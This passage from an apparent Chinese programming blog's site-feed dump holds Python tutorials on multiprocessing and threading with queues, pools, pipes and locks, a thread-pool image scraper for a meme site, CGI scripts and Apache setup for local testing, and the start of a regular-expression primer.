#这里是多进程并发的要点，q是一个JoinableQueue对象，支持get方法读取第一个元素，如果q中没有元素，进程就会阻塞，直至q中被存入新元素 value = q.get() print('GET &#123;&#125; from queue.'.format(value)) time.sleep(random.random()) finally: q.task_done()#通过多进程将26个字母打印出来def main(): #定义一个存放任务的JoinableQueue对象 q = multiprocessing.JoinableQueue() #实例化两个Process对象（每个对象对应一个子进程）target是实现每个任务工作中的具体函数，args是target函数的参数 pw1 = multiprocessing.Process(target=read, args=(q,)) pw2 = multiprocessing.Process(target=read, args=(q,)) #将子进程设为守护进程———在主进程结束后随之结束 pw1.daemon = True pw2.daemon = True #子进程就开始独立于父进程运行了，它会在单独的进程里调用target引用的函数——在这里即read函数，它是一个死循环，将参数q中的数一一读取并打印出来 pw1.start() pw2.start() #实际上start执行以后进程就阻塞了，由于JoinableQueue对象没有传入元素，等待传入元素才开始执行 for x in [chr(ord('A')+i) for i in range(26)]: q.put(x) try: #这里是查询q中的数据是否已经读完，如果没有读完阻塞程序，等待q中的数据读完才开始继续执行 q.join() except KeyboardInterrupt: print('stopped by hand')if __name__ == "__main__": main() 通过这个实例可以看出python通过JoinableQueue实现多进程并发的优雅 通过队列实现多线程的并发 程序的实现与多进程差别不大，只是这里不用multiProcessing.JoinableQueue进行队列的操作，一般的队列就可以满足要求 通过队列实现多线程并发实例：打印26个字母（代码和多进程的差别并不大） 1234567891011121314151617181920212223242526272829import time, randomimport threading, queuedef read(q): while True: try: value = q.get() print('GET &#123;&#125; from queue.'.format(value)) time.sleep(random.random()) finally: q.task_done()def main(): q = queue.Queue() pw1 = threading.Thread(target=read, args=(q,)) pw2 = threading.Thread(target=read, args=(q,)) pw1.daemon = True pw2.daemon = True pw1.start() pw2.start() for x in [chr(ord('A')+i) for i in range(26)]: q.put(x) try: q.join() except KeyboardInterrupt: print('stopped by hand')if __name__ == "__main__": main() 多线程补充 既然说到了用队列实现多线程并发，再补充通过threading初始化，不调用队列实现多线程并发，这里要多出一个线程不安全的问题，用线程锁来解决 不设计线程锁实例：(以前测试的时候出现线程不安全的问题，现在运行以后没有了，应该是python版本的修复) 123456789101112131415161718192021import threadingclass MyThread(threading.Thread): def __init__(self): threading.Thread.__init__(self) def run(self): global n print(n,self.name) n += 1if "__main__" == __name__: n = 0 ThreadList = [] for i in range(0, 10): t = MyThread() ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join 设计线程锁的实例（尽管现在测试没有出现线程不安全的问题，还是将它作为补充） 12345678910111213141516171819202122232425import threading, timeclass MyThread(threading.Thread): def __init__(self): threading.Thread.__init__(self) def run(self): global n, lock time.sleep(1) if lock.acquire(): print(n , self.name) n += 1 lock.release()if "__main__" == __name__: n = 1 ThreadList = [] lock = threading.Lock() for i in range(1, 200): t = MyThread() ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join() 通过进程池和线程池来实现并发设计 通过进程池和线程池实现并发设计，也算是对上一篇多进程学习的补充与应用 进程池 进程池的使用有四种方式：apply_async、apply、map_async、map。其中apply_async和map_async是异步的，也就是启动进程函数之后会继续执行后续的代码不用等待进程函数返回。apply_async和map_async方式提供了一些获取进程函数状态的函数：ready()、successful()、get()。join()放在close()后面，是多进程中说到过的 通过一个实例来体现Python的进程池中的四种方法的特点，主要的区别是在异步 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import multiprocessingimport timedef func(msg): print('msg:',msg) # time.sleep(1) return 'func_return: %s' % msgif __name__ == "__main__": #apply_async print('\n------apply_async--------') pool = multiprocessing.Pool(processes=4) results = [] for i in range(10): msg = 'hello fsdfs %d' % i result = pool.apply_async(func,(msg,)) results.append(result) print('apply_async:不阻塞') for i in results: i.wait() #等待进程函数执行完毕 for i in results: if i.ready(): #判断进程函数是否已经启动了 if i.successful(): #判断进程函数是否执行成功 print(i.get()) #输出进程函数的返回值 #apply print('\n----------apply---------') pool = multiprocessing.Pool(processes=4) results = [] for i in range(10): msg = 'hello fsdfs %d' % i result = pool.apply(func,(msg,)) results.append(result) print('apply:阻塞') #执行完func才可以执行该语句 pool.close() pool.join() print(results) #map print('\n---------map-----------') args = [1,2,3,4,5] pool = multiprocessing.Pool(processes=5) return_data = pool.map(func,args) print('map:阻塞') #执行完func才执行该语句 pool.close() pool.join() print(return_data) #map_async print('\n-------map_async---------') pool = multiprocessing.Pool(processes=5) result = pool.map_async(func,args) print('ready:',result.ready()) print('不阻塞') result.wait() #等待所有进程函数执行完毕 if result.ready(): #判断进程函是否已经启动了 if result.successful(): #判断进程函数是否执行成功 print(result.get()) #输出进程函数的返回值 线程池 线程池使用multiprocessing提供的线程池，线程池的使用有四种方式：apply_async、apply、map_async、map，代码与进程池类似。下面直接贴代码，实现的过程与进程池基本一致 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from multiprocessing.dummy import Pool as ThreadPoolimport timedef func(msg): print('msg:',msg) # time.sleep(1) return 'func_return: %s' % msgif __name__ == "__main__": #apply_async print('\n------apply_async--------') pool = ThreadPool(processes=4) results = [] for i in range(10): msg = 'hello fsdfs %d' % i result = pool.apply_async(func,(msg,)) results.append(result) print('apply_async:不阻塞') for i in results: i.wait() #等待进程函数执行完毕 for i in results: if i.ready(): #判断进程函数是否已经启动了 if i.successful(): #判断进程函数是否执行成功 print(i.get()) #输出进程函数的返回值 #apply print('\n----------apply---------') pool = ThreadPool(processes=4) results = [] for i in range(10): msg = 'hello fsdfs %d' % i result = pool.apply(func,(msg,)) results.append(result) print('apply:阻塞') #执行完func才可以执行该语句 # pool.close() # pool.join() print(results) #map print('\n---------map-----------') args = [1,2,3,4,5] pool = ThreadPool(processes=5) return_data = pool.map(func,args) print('map:阻塞') #执行完func才执行该语句 pool.close() pool.join() print(return_data) #map_async print('\n-------map_async---------') pool = ThreadPool(processes=5) result = pool.map_async(func,args) print('ready:',result.ready()) print('不阻塞') result.wait() #等待所有进程函数执行完毕 if result.ready(): #判断进程函是否已经启动了 if result.successful(): #判断进程函数是否执行成功 print(result.get()) #输出进程函数的返回值 对比 通过对比可以发现线程池和进程池的代码差别并不是很大，和前面通过队列实现并发一样，所以在选取以何种方式做并发时还是要结合实际的情况 实例应用 学习了这么多，还是要进行实际运用，接下来利用线程池做一个高并发的爬虫，同时也可以巩固一下爬虫。这个练习是通过线程池结合队列爬取表情包(emmm)，以斗图啦网站为例(https://www.doutula.com) 分析页面，在最新表情中表情包最多，一共有1655页，每一页的连接为：https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png) 当然，我们查看的时候看到的是浏览器渲染以后的页面，所以元素可能会是动态生成的；如果要查看未渲染之前的图片，直接查看源码，也是一样的。 分析一下图片的连接：该网站使用新浪的图床ws1.sinaimg.cn,多查看几个图片地址发现不一定是ws1子域名 ，可能是是任何ws开头，后面跟数字 ，出现这种情况的原因是：根据HTTP/1.1协议规定，浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞 ，所以利用不同的子域来绕过限制。这一点其实不影响我们（假如你的正则是直接匹配图片完整连接） 经过测试，网站没有做反爬，接下来就简单了，步骤如下： 获取单个页面用正则匹配img标签的图片地址和图片描述 将获取到的表情包下载保存 改变page参数爬取所有的列表页面 当然，重要的是用上线程池，为了提高爬取速度，再加上进程的通信 代码实现： 设置图片保存的文件夹 1BASE_DIR = os.path.join(os.path.dirname(__file__) + '/pic') 创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信 123picqueue = multiprocessing.Queue()pagequeue = multiprocessing.Queue()logqueue = multiprocessing.Queue() 创建两个线程池，分别用于图片任务和页面任务 12picpool = ThreadPool(30)pagepool = ThreadPool(3) 用正则去匹配图片信息，并将获取到的图片链接和描述入队 12345678def get_imglist(html): pattern = re.compile('data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;',re.S) img_list = re.findall(pattern,html) for url, name in img_list: #将图片的后缀加到name中，方便后面的保存 name = name + url[-4:] logqueue.put(url) picqueue.put((name,url)) 获取页面的源码（尽管没有限制，但还是加上UA头和cookie） 123456789101112def get_page(): #进行会话的保持,确保连接的是同一个页面，将同一个页面的爬取完以后再连接下一个页面 http = requests.Session() headers = &#123; 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Cookie':'' &#125; while True: papeid = pagequeue.get() response = http.get('http://www.doutula.com/photo/list/?page=&#123;&#125;'.format(papeid), headers=headers,timeout=2) # print(response.text) get_imglist(response.text) 保存表情包： 12345678910111213def save_file(): #判断当前位置是唯一的连接 http = requests.Session() while True: name, url = picqueue.get() #判断是否已经下载该图片 if not os.path.isfile(os.path.join(BASE_DIR, name)): # req = http.get(url) try: with open(os.path.join(BASE_DIR,name),'wb+') as f: f.write(http.get(url).content) except: error.append([name,url]) 主函数（启动线程池，队列等） 123456789101112131415161718ef main(): if not os.path.isdir(BASE_DIR): os.mkdir(BASE_DIR) # get_page() #将页码放入队列中 for i in range(1,1656): # print(type(i)) pagequeue.put(i) #启动页面任务池 for i in range(3): pagepool.apply_async(get_page) #启动图片任务池 for i in range(30): picpool.apply_async(save_file) while True: print(logqueue.get(),picqueue.qsize(),pagequeue.qsize()) 完整代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import reimport osimport requestsimport multiprocessingfrom multiprocessing.pool import ThreadPool#设置图片保存的文件夹,如果运行的py文件存在，os.path.dirname(__file__)输出完整的目录，如果是相对路径，输出为空BASE_DIR = os.path.join(os.path.dirname(__file__) + '/pic')# print(BASE_DIR)#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信picqueue = multiprocessing.Queue()pagequeue = multiprocessing.Queue()logqueue = multiprocessing.Queue()#创建两个线程池，分别用于图片任务和页面任务picpool = ThreadPool(30)pagepool = ThreadPool(3)error = []#用正则去匹配图片信息def get_imglist(html): pattern = re.compile('data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;',re.S) img_list = re.findall(pattern,html) for url, name in img_list: name = name + url[-4:] logqueue.put(url) picqueue.put((name,url))def get_page(): #进行会话的保持 http = requests.Session() headers = &#123; 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Cookie':'' &#125; while True: papeid = pagequeue.get() response = http.get('http://www.doutula.com/photo/list/?page=&#123;&#125;'.format(papeid), headers=headers,timeout=2) # print(response.text) get_imglist(response.text)def save_file(): #判断当前位置是唯一的连接 http = requests.Session() while True: name, url = picqueue.get() #判断是否已经下载该图片 if not os.path.isfile(os.path.join(BASE_DIR, name)): # req = http.get(url) try: with open(os.path.join(BASE_DIR,name),'wb+') as f: f.write(http.get(url).content) except: error.append([name,url])def main(): if not os.path.isdir(BASE_DIR): os.mkdir(BASE_DIR) # get_page() #将页码放入队列中 for i in range(1,1656): # print(type(i)) pagequeue.put(i) #启动页面任务池 for i in range(3): pagepool.apply_async(get_page) #启动图片任务池 for i in range(30): picpool.apply_async(save_file) while True: print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())if __name__ == "__main__": main() 运行结果： 以上是通过正则表达式来做的，下面稍加修改，用解析库来做： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import osimport requestsimport multiprocessingfrom bs4 import BeautifulSoupfrom multiprocessing.pool import ThreadPoolBASE_DIR = os.path.join(os.path.dirname(__file__) + '/pic')# print(BASE_DIR)#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信picqueue = multiprocessing.Queue()pagequeue = multiprocessing.Queue()logqueue = multiprocessing.Queue()#创建两个线程池，分别用于图片任务和页面任务picpool = ThreadPool(30)pagepool = ThreadPool(3)error = []def get_imglist(html): soup = BeautifulSoup(html,'lxml') img_list = soup.find_all('a',class_='col-xs-6 col-sm-3') # print(img_list) for imgs in img_list: try: url = imgs.find('img')['data-original'] name = imgs.find('p',style='display: none').text + url[-4:] except: pass logqueue.put(url) picqueue.put((name,url))def get_page(): #进行会话的保持 http = requests.Session() headers = &#123; 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Cookie':'' &#125; while True: papeid = pagequeue.get() response = http.get('http://www.doutula.com/photo/list/?page=&#123;&#125;'.format(papeid), headers=headers,timeout=2) get_imglist(response.text)def save_file(): #判断当前位置是唯一的连接 http = requests.Session() while True: name, url = picqueue.get() #判断是否已经下载该图片 if not os.path.isfile(os.path.join(BASE_DIR, name)): # req = http.get(url) try: with open(os.path.join(BASE_DIR,name),'wb+') as f: f.write(http.get(url).content) except: error.append([name,url])def main(): if not os.path.isdir(BASE_DIR): os.mkdir(BASE_DIR) #将页码放入队列中 for i in range(1,1656): # print(type(i)) pagequeue.put(i) #启动页面任务池 for i in range(3): pagepool.apply_async(get_page) #启动图片任务池 for i in range(30): picpool.apply_async(save_file) while True: print(logqueue.get())if __name__ == "__main__": main() 总结 本文是对python实现并发的学习总结，具体有python进程并发编程的几种方式以及它们之间的关联与区别，通过实例来体现与利用，最后的实例加上了爬虫的内容，这是再学习安全之余对于编程的学习，安全最后还是离不开代码，相辅相成。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>线程池</tag>
        <tag>进程池</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python CGI编程]]></title>
    <url>%2F2018%2F06%2F17%2Fpython-CGI%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[python CGI编程###什么是CGI CGI(Commom Gateway Interface)通用网关接口，它是一段程序，运行在服务器。如HTTP服务器，提供同客户端HTML页面的接口。 网页浏览 通过在网页上点击一个链接或URL的流程了解CGI是如何工作的 使用浏览器访问URL连接到HTTP web 服务器 web 服务器接收到请求以后解析URL，并查找访问文件是否在HTTP服务器上存在，如果存在返回内容，不存在返回错误信息 CGI程序可以是python脚本，Perl脚本，shell脚本，C或C++程序等 CGI架构图及其本地环境配置 采用PHPstudy+windows测试，修改httpd.conf配置文件 123456789101112131415# 查找一下自己的DocumentRoot DocumentRoot &quot;E:\Environment\phpstudy\PHPTutorial\WWW&quot;&lt;Directory /&gt; AllowOverride All Options +ExecCGI Order allow,deny Allow from all #Require all granted&lt;/Directory&gt;#让apache识别py文件为cgi程序：AddHandler cgi-script .cgi .py 只允许在特别目录下执行cgi程序:ScriptAlias /cgi-bin/ &quot;D:/Program/phpStudy/Apache/cgi-bin/&quot; 测试实例（python不用指定编码，测试了时候指定编码出现乱码） 12345678910111213141516#!D:/python36/python.exeprint ("Content-type:text/html")print () # 空行，告诉服务器结束头部print ('&lt;html&gt;')print ('&lt;head&gt;')# print ('&lt;meta charset="UTF-8"&gt;')print ('&lt;title&gt;Hello Word 你好123！&lt;/title&gt;')print ('&lt;/head&gt;')print ('&lt;body&gt;')print ('&lt;h2&gt; Hello Word! 菜鸟123&lt;/h2&gt;')print ('&lt;/body&gt;')print ('&lt;/html&gt;')#作为http协议的要求，一定要输出http headers#在存在http headers的前提下，一定要在headers后面打印一个空行，否则服务器会报错 CGI HTTP头部及CGI环境变量 CGI实例 通过CGI输出CGI环境变量 12345678910#!D:/python36/python.exeimport osprint("Content-type: text/html")print()print("&lt;b&gt;环境变量&lt;/b&gt;&lt;br&gt;")print("&lt;ul&gt;")for i in os.environ.keys(): print("&lt;li&gt;&lt;span style='color:green'&gt;%30s&lt;/span&gt; : %s&lt;/li&gt;" % (i,os.environ[i]))print("&lt;/ul&gt;") 通过CGI实现GET传递信息（也可以通过构造表单的方法实现GET信息传递，默认情况下只存放脚本文件） 123456789101112131415161718192021#!D:/python36/python.exeimport cgi, cgitb#创建filedstorage的实例、form = cgi.FieldStorage()#获取数据s_name = form.getvalue('name')s_url = form.getvalue('url')print("Content-type:text/html")print()print("&lt;html&gt;")print("&lt;head&gt;")print("&lt;title&gt;测试&lt;/title&gt;")print("&lt;/head&gt;")print("&lt;body&gt;")print("&lt;h2&gt;%s博客：%s&lt;/h2&gt;" % (s_name,s_url))print("&lt;/body&gt;")print("&lt;/html&gt;") 通过CGI用POST传递数据（使用上面的GET脚本结合表单来POST传递） 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;菜鸟&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="get1.py" method="post"&gt;站点名称: &lt;input type="text" name="name"&gt; &lt;br /&gt;站点 URL: &lt;input type="text" name="url" /&gt;&lt;input type="submit" value="提交" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;/form&gt; 通过CGI程序来传递CheckBox数据（需要一个表单和CGI处理的脚本文件） cgi脚本文件 123456789101112131415161718192021222324252627#!D:/python36/python.exeimport cgi, cgitbform = cgi.FieldStorage()#接收字段数据if form.getvalue('google'): google_flag = "是"else: google_flag = "否"if form.getvalue('lsowl'): lsowl_flag = "是"else: lsowl_flag = "否"print("Content-type:text/html")print()print("&lt;html&gt;")print("&lt;head&gt;")print("&lt;title&gt;测试&lt;/title&gt;")print("&lt;/head&gt;")print("&lt;body&gt;")print("&lt;h2&gt;lsowl是否选择了 : %s&lt;/h2&gt;" % lsowl_flag)print("&lt;h2&gt;google是否选择了 : %s&lt;/h2&gt;" % google_flag)print("&lt;/body&gt;")print("&lt;/html&gt;") 传递数据的表单 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="checkbox.py" method="POST" target="_blank"&gt;&lt;input type="checkbox" name="lsowl" value="on" /&gt; lsowl&lt;input type="checkbox" name="google"value="on" /&gt; google&lt;input type="submit" value="选择站点"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 通过CGI传递Radio数据（只向服务器传输一个数据） 传递Radio数据的CGI脚本 123456789101112131415161718192021#!D:/python36/python.exeimport cgi, cgitbform = cgi.FieldStorage()if form.getvalue('site'): site = form.getvalue('site')else: site = '提交的数据为空'print ("Content-type:text/html")print ()print ("&lt;html&gt;")print ("&lt;head&gt;")print ("&lt;title&gt;测试&lt;/title&gt;")print ("&lt;/head&gt;")print ("&lt;body&gt;")print ("&lt;h2&gt; 选中的网站是 %s&lt;/h2&gt;" % site)print ("&lt;/body&gt;")print ("&lt;/html&gt;") 传递Radio数据的CGI表单 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="radion.py" method="post" target="_blank"&gt;&lt;input type="radio" name="site" value="lsowl" /&gt; lsowl&lt;input type="radio" name="site" value="google" /&gt; Google&lt;input type="submit" value="提交" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 通过CGI程序传递 Textarea 数据、下拉数据等、设置cookie、上传下载文件，这些只需要改一些HTML方法就可以实现，和上面的本质上没有什么区别 总结 本文是对python的CGI编程的一个学习，学习了CGI及python CGI编程的特性，通过CGI结合前端实现许多功能，由于后面上传下载文件这些只是修改一些方法和HTML元素，本质上差别不大，就没有写完了，可以参考链接 tp://www.runoob.com/python3/python3-cgi-programming.html]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>CGI编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python多进程]]></title>
    <url>%2F2018%2F06%2F16%2Fpython%E5%A4%9A%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[python多进程 python跨平台实现多进程需要使用multiprocessing这个模块，在模块中常用的两个类是process和pool process类 process类用来描述一个进程对象。创建子进程的时候只需要传入一个执行函数和函数的参数就可以完成process实例的创建。 start() 方法启动进程 join() 方法实现进程之间的同步，等待所有进程退出 close()方法阻止多余的进程涌入进程池pool造成进程阻塞 1234567891011121314151617181920212223242526272829303132333435363738394041 __init__(self, group=None, target=None, name=None, args=(), kwargs=&#123;&#125;, *,mon=None)| 初始化类，target指向函数名，name参数可以为该进程设置名称，args是为target指向的函数传入的参数，且为tuple类型的|| is_alive(self)| 返回这个进程是否alive|| join(self, timeout=None)| 等待，直到子进程执行完毕|| run(self)| Method to be run in sub-process; can be overridden in sub-class|| start(self)| 开启子进程|| terminate(self)| 结束进程| ----------------------------------------------------------------------| Data descriptors inherited from multiprocessing.process.BaseProcess:|| __dict__| dictionary for instance variables (if defined)|| __weakref__| list of weak references to the object (if defined)|| authkey|| daemon| 返回该进程是否为守护进程|| exitcode| 返回进程的退出代码|| ident| Return identifier (PID) of process or `None` if it has yet to start|| name|| pid| Return identifier (PID) of process or `None` if it has yet to start process类使用实例 123456789101112131415import multiprocessing,os def run_proc(name): print('Child process &#123;0&#125; &#123;1&#125; Running'.format(name,os.getpid())) if __name__ == '__main__': print('Parent process &#123;0&#125; is Running'.format(os.getpid())) for i in range(5): p = multiprocessing.Process(target=run_proc,args=(str(i),)) print('process start') p.start() p.join() print('process close') #这里创建多个进程可以使用for循环，也可以使用进程池，在使用for循环的时候注意join方法在for循环之外 Pool类 Pool类可以提供指定数量的进程供用户使用，默认是CPU核数。当有新的请求提交到Pool的时候，如果进程池没有满，则会创建一个进程执行，如果进程池满了，则会让该请求等待。 Pool对象调用join方法会等待所有的子进程执行完毕 调用join方法前必须调用close() 调用close()以后就不能继续添加新的Process pool.apply_async() 直接启动了进程，不用使用start来启动（同步执行进程，允许多个进程同时进入进程池） pool类使用实例（使用apply_async()来执行进程） 123456789101112131415161718import multiprocessingimport osimport time def run_task(name): print('Task &#123;0&#125; pid &#123;1&#125; is Running, Parent id is &#123;2&#125;'.format(name,os.getpid(),os.getppid())) time.sleep(1) print('Task &#123;0&#125; end'.format(name)) if __name__ == '__main__': print('current process &#123;0&#125;'.format(os.getpid())) p = multiprocessing.Pool(processes=3) for i in range(6): p.apply_async(run_task,args=(i,)) print('Waiting for all subprocesses done...') p.close() p.join() print('All process done!') pool使用实例（pool.apply(func[,args[，kwds]]) 只允许一个进程进入进程池，在一个进程结束以后，另外一个进程才可以进入执行） 123456789101112131415161718import multiprocessingimport osimport time def run_task(name): print('Task &#123;0&#125; pid &#123;1&#125; is running, parent id is &#123;2&#125;'.format(name, os.getpid(), os.getppid())) time.sleep(1) print('Task &#123;0&#125; end.'.format(name)) if __name__ == '__main__': print('current process &#123;0&#125;'.format(os.getpid())) p = multiprocessing.Pool(processes=3) for i in range(6): p.apply(run_task,args=(i,)) print('Waiting for all subprocesses done...') p.close() p.join() print('All process done!') 进程间的通信 使用python标准库中的subprocess包来fork一个子进程，并运行一个外部的程序 subprocess.call(command,shell=True) fork一个子进程，并运行一个外部程序(命令)在本进程中显示结果 subprocess.check_output(command) 将外部命令执行结果放入变量，不在控制台输出 可以看出subprocess.call和check_output的返回结果，call执行成功返回一个0，否则返回非零数，check_output返回命令执行的结果 multiprocessing提供的Queue（Queue用来在多个进程间的通信，Queue有两个方法，get和put） put方法用来插入数据到队列中。有两个可选参数，blocked和timeout blocked = True（默认值），timeout 为正 该方法会阻塞 timeout 指定的时间，直到该队列有剩余空间。如果超时，抛出 Queue.Full 异常 blocked = False 如果 Queue 已满，立刻抛出 Queue.Full 异常 get方法用来从队列中读取并删除一个元素。有两个参数可选，blocked 和 timeout blocked = False （默认），timeout 正值 等待时间内，没有取到任何元素，会抛出 Queue.Empty 异常 blocked = True Queue 有一个值可用，立刻返回改值；Queue 没有任何元素 Queue实例 123456789101112131415161718192021222324252627282930313233from multiprocessing import Process, Queueimport os, time, random #写数据进程def proc_write(q,urls): print('Process &#123;0&#125; is writing...'.format(os.getpid())) for url in urls: q.put(url) print('Put %s to queue..' % url) time.sleep(random.random()) #读数据进程def proc_read(q): print('Process &#123;0&#125; is reading...'.format(os.getpid())) while True: url = q.get(True) print('Get %s from queue...' % url) if __name__ == '__main__': q = Queue() proc_write1 = Process(target=proc_write,args=(q,['url_1','url_2','url_3','url_4'])) proc_write2 = Process(target=proc_write,args=(q,['url_4','url_5','url_6'])) proc_reader = Process(target=proc_read,args=(q,)) #启动子进程写入 proc_write1.start() proc_write2.start() #启动子进程读取 proc_reader.start() #等待写入进程结束 proc_write1.join() proc_write2.join() #proc_reader进程是死循环，无法等待结束，只能强行终止 proc_reader.terminate() multiprocessing提供的Pipe(常用来在两个进行间的通信，两个进程分别位于管道的两端) multiprocessing.Pipe([duplex]) pipe实例一（发送列表） 12345678910111213from multiprocessing import Process, Pipe def send(pipe): pipe.send(['spm']+[545,'wdd']) #send传输一个列表 pipe.close() if __name__ == '__main__': #实例化两个pipe对象，因为pipe进程通信实在管道的两边 (c1,c2) = Pipe() sender = Process(target=send,args=(c1,)) sender.start() print("c2 got: &#123;0&#125; ".format(c2.recv())) c2.close() pipe实例二（发送字典文件） 123456789101112131415from multiprocessing import Process, Pipe def talk(pipe): pipe.send(dict(name='ss',age=22)) reply = pipe.recv() print('talk got:',reply) if __name__ == '__main__': (a1, a2) = Pipe() c = Process(target=talk, args=(a2,)) #创建一个进程 c.start() print('parent got:',a1.recv()) a1.send(&#123;x * 2 for x in 'spam'&#125;) c.join() #传输的数据被 talk 函数内的 pip 管道接收，并赋值给 reply print('parent exit') 上述的queue和pipe都是进程间的通信，实在一个进行池中，如果不在一个进程池中，用multiprocessing.Manager().Queue() 通信；同时：子进程与父进程的通信试用subprocess比较好 不同进程池之间的通信实例如下 123456789101112131415161718192021222324252627282930313233343536373839404142from multiprocessing import Process,Pool,Queue,Managerimport os,time,random def write(q,list,i): print("[+] This is Process_"+str(i)+" and pid is %s START"%os.getpid()) for item in list: q.put(item) print("[+] Pid %s Put : %s"%(os.getpid(),item)) print("[+] This is Process_"+i+" and pid is %s CLOSE"%os.getpid())def test(): print(os.getpid()) def read(q): print('[====] Process to Read , pid = %s'%os.getpid()) while True: data = q.get(True) print("[=] data from Queue : %s"%str(data)) def main(): manager = Manager() q = manager.Queue() p = Pool(5) listx = [] listx.append([x for x in range(10)]) listx.append([x for x in range(100,110)]) listx.append([x for x in range(200,210)]) listx.append([x for x in range(300,310)]) listx.append([x for x in range(400,410)]) for i in range(5): if i==4: pass p.apply_async(read,args=(q,)) else: list = listx[i] #print(list) p.apply_async(write,args=(q,list,i)) p.close() p.join() if __name__ == '__main__': main() 总结 通过一些实例学习python3的多进程，包含了主要的两个类及其适用方法；同一进程池中进程间通信，不同进程池中进程间的通信以及父类与子类的进程间通信]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3正则表达式学习]]></title>
    <url>%2F2018%2F06%2F15%2Fpython3%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[python3正则表达式学习 正则表达式是一个特殊的字符序列，它能帮助你方便检查一个字符串是否与某种模式匹配。python提供re模块使python语言拥有全部正则表达式功能。 compile函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。 正则表达式基础 子模式 1234\w: 匹配任意字母、数字、或者_\d: 匹配数字（十进制）\s: 匹配空白符号（空格、tab等）. : 匹配任意字符（换行符除外） 重复子模式 123\d* : 表示任意数字，包括0个，*匹配0次或者多次\w+ : 表示匹配至少一个字母、数字、或者_\w&#123;3:6&#125; :表示匹配3-6之间的字母、数字、或者_ “或”运算 - | (p|P)ython :可以匹配Python也可以匹配python 选择符：？ 1(https://)?(www.)?(lsowl.xyz) :可以匹配到：https://www.lsowl.xyz https://lsowl.xyz www.lsowl.xyz lsowl.xyz 四个，也就是字符串必须在最后一个元组才可以被匹配到 字符集：[] 12[a-zA-Z0-9_] : 等价于\w[0-9a-zA-Z\.\_] : 匹配数字、字母、.和_ 开始符和结尾符：^ , $ 123^\d : 以数字开始\w$ : 以字母结尾^[a-zA-Z][0-9a-zA-Z\_]* :匹配python的合法变量 分组: () 捕获组 (^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.\w+ : 匹配邮箱用户名 非捕获组 123(^[0-9a-zA-Z]\w&#123;5,17&#125;)@[0-9a-zA-Z]+\.(?:net|com|top|cn) ：捕获指定后缀名的邮箱用户名(?:\d+\.)&#123;3&#125;\d+ : 匹配IP 正则表达式使用的特殊符号和字符 12345678910111213141516171819202122literal 匹配字符串的值re1|re2 匹配正则表达式re1或re2. 匹配任意字符（换行符除外）^ 匹配字符串的开始$ 匹配字符串的结尾* 匹配前面出现的正则表达式零次或多次+ 匹配前面出现的正则表达式一次或多次？匹配前面出现的正则表达式零次或一次&#123;N&#125; 匹配前面出现的正则表达式N次&#123;M,N&#125; 匹配重复出现M次到N次的正则表达式[…] 匹配字符组里出现的任意一个字符[…x-y…] 匹配从字符x到y中的任意一个字符[^…] 不匹配此字符集中出现的任意一个字符(*|+|?|&#123;&#125;)? 用于上面出现的任何“非贪婪”。版本重复匹配次数符号。如.*?a表示匹配到第一个a出现取前面任意长度的字符。(…) 